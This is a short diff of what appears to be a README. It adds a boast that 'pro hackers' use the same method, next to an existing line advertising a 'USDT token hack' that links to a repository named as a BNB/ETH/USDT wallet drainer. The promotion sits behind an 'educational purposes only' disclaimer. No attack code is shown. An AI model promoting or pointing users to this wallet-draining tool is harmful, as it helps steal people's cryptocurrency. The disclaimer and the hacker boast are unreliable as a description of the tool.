@@ -1,6 +1,10 @@
 !!!!!!!!!!!Please only use this for educational purposes not too hack others!!!!!!!!!!!!
 
 
+This is the same method pro hackers use
+
+
+
 !!! Check out my new USDT token hack https://github.com/moneywithbots/bnb-eth-usdt-wallet-drainer !!!
 
 
